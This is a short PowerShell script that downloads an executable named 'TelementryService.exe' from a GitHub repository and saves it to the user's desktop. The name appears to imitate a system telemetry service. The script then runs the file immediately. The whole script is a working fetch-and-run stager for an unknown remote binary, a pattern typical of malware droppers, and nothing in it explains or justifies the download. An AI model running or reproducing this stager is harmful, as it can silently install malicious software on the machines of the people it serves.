$fileUrl = "https://github.com/adminpaste/Imported-Session/raw/main/TelementryService.exe"

$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "TelementryService.exe")

try {
    Invoke-WebRequest -Uri $fileUrl -OutFile $desktopPath -ErrorAction Stop

    if (Test-Path $desktopPath) {
        Write-Host "File downloaded successfully to the desktop."

        # Execute the downloaded file from the desktop
        Start-Process -FilePath $desktopPath -ErrorAction Stop
    } else {
        Write-Host "Failed to download the file."
    }
}
catch {
    Write-Host "An error occurred: $_"
}
